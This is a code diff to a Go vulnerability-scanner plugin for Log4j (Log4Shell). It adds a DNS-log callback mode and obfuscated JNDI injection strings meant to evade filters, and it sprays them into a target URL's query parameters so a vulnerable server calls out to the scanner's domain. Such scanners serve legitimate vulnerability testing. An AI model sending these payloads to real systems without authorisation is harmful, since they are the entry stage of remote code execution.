@@ -11,9 +11,12 @@ import (
 var checkPayloads map[string][]string
 
 func init() {
-	Common.AddBugScanListPerFile(Log4JScan{Common.PluginBase{Name: "Log4JScan", Desc: "Log4j 命令执行漏洞", Type: "RCE", Level: 2, TimeOut: 3, Ltype: "JAVA"}})
+	Common.AddBugScanListPerFile(Log4JScan{Common.PluginBase{Name: "Log4JScan", Desc: "Log4j 命令执行漏洞", Type: "RCE", Level: 2, TimeOut: 4, Ltype: "JAVA"}})
 	checkPayloads = map[string][]string{
-		"ldap": []string{"${jndi:ldap://%s/%s}"},
+		"dig": []string{"${jndi:ldap://%s.%s/}", "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s.%s}",
+			"${jndi:${lower:l}${lower:d}a${lower:p}://%s.%s}", "${${::-j}ndi:ldap://%s.%s}"},
+		"ldap": []string{"${jndi:ldap://%s/%s}", "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s/%s}",
+			"${jndi:${lower:l}${lower:d}a${lower:p}://%s/%s}", "${${::-j}ndi:ldap://%s/%s}"},
 	}
 }
 
@@ -28,7 +31,6 @@ func (p Log4JScan) Exec(p1 Common.PluginBaseFun, request Common.Request, respons
 	p.Request = request
 	p.Response = response
 	p.Audit()
-
 }
 
 func (p Log4JScan) CheckLog(checkList []Log4JChekcRsult, reverse *Common.Reverse) (Log4JChekcRsult, bool) {
@@ -44,6 +46,23 @@ func (p Log4JScan) CheckLog(checkList []Log4JChekcRsult, reverse *Common.Reverse
 
 		}
 
+	} else if reverse.ReverseType == "dig" {
+		for _, checkInfo := range checkList {
+			if checkInfo.CheckCount < 5 {
+				map1 := map[string]string{}
+				map1["token"] = reverse.DigToken
+				map1["domain"] = reverse.ReverseCheckDomain
+				result := Common.CheckDNSLog_Platform_Golang(reverse.ReverseDomain, map1)
+				if result != nil {
+					for _, v := range result {
+						if strings.Contains(v, checkInfo.CheckId) {
+							return checkInfo, true
+						}
+					}
+				}
+				checkInfo.CheckCount++
+			}
+		}
 	}
 	return Log4JChekcRsult{}, false
 
@@ -78,7 +97,15 @@ func (p Log4JScan) Audit() {
 					v1 := requestVuls.Get(k1)
 					r1 := Common.RandStr(16)
 					r2 := Common.Md5(r1 + p.Request.CheckUrl.String())
-					main_payload := fmt.Sprintf(payload, reverse.ReverseDomain, r2)
+
+					main_payload := ""
+					if reverse.ReverseType == "ldap" {
+						main_payload = fmt.Sprintf(payload, reverse.ReverseDomain, r2)
+					} else if reverse.ReverseType == "dig" {
+						main_payload = fmt.Sprintf(payload, r2, reverse.ReverseDomain[:len(reverse.ReverseDomain)-1])
+					} else {
+						return
+					}
 					requestVuls.Set(k1, main_payload)
 					p.Request.CheckUrl.RawQuery = requestVuls.Encode()
 					result := Ghttp.Analyze(p.Request.CheckUrl.String(), "GET", "", p.Request.Header, p.TimeOut)
